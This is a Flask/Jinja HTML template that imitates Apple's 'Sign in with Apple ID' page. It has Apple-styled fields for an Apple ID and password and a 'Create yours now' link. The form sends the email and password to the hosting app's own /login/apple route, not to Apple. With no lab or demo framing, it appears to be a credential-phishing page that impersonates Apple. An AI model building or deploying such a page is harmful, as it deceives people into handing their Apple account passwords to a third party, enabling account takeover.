<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in with Apple ID</title>
    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Text:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="{{ url_for('static', filename='apple.css') }}">
</head>
<body>

<div class="login-card">
    <div class="icon-circle">
    <svg width="40" height="40" viewBox="0 0 170 170" fill="currentColor" xmlns="http://www.w3.org/2000/svg">

    </svg>
</div>
    <h1>Sign in with Apple ID</h1>

    <form action="/login/apple" method="POST">
        <div class="input-container">
            <input type="email" name="apple_email" placeholder="Apple ID" required autofocus>
        </div>
        
        <div class="input-container">
            <input type="password" name="apple_password" placeholder="Password" required>
        </div>

        <button type="submit" class="submit-btn">Sign In</button>
    </form>

    <div class="links">
        <a href="#">Forgot Apple ID or password?</a>
    </div>

    <p class="placeholder-text">
        Your Apple ID is the account you use for everything Apple. 
        <br>
        <a href="{{ url_for('signup') }}">Create yours now.</a>
    </p>
</div>

</body>
</html>
